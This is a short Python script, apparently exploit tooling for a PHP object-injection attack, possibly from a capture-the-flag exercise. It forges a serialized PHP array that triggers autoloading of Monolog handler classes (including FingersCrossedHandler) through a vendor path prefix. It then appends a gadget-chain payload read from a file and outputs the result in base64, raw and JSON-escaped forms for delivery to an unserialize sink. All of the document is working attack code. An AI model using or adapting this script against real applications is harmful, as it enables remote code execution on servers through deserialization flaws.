import base64
reqs = [
    'Handler_HandlerInterface',
    'Handler_Handler',
    'Handler_ProcessableHandlerInterface',
    'ResettableInterface',
    'Handler_FormattableHandlerInterface',
    'Handler_ProcessableHandlerTrait',
    'Handler_GroupHandler',
    'Handler_FingersCrossedHandler',
]

payload = open('./payload', 'rb').read().strip()

base = 'www_frontend_vendor_monolog_monolog_src_Monolog_'
# i:0;O:72:"www_frontend_vendor_monolog_monolog_src_Monolog_Handler_HandlerInterface":0:{}
def gen_reqs():
    parts = []
    for i,v in enumerate(reqs):
        pth = f'{base}{v}'
        parts.append(f'i:{i};O:{len(pth)}:"{pth}":0:{{}}'.encode('utf-8'))

    parts.append(f'i:{len(reqs)};'.encode('utf-8') + payload)
    joined = b''.join(parts)
    return f'a:{len(parts)}:{{'.encode('utf-8') + joined + b'}'

def make_json_compat(inp):
    return b'"' + inp.replace(b'\\', b'\\\\').replace(b'\x00', b'\\u0000').replace(b'"', b'\\"') + b'"'

print(base64.b64encode(gen_reqs()).decode('utf-8'))
print()
print(gen_reqs())
print()
print(make_json_compat(gen_reqs()).decode('utf-8'))
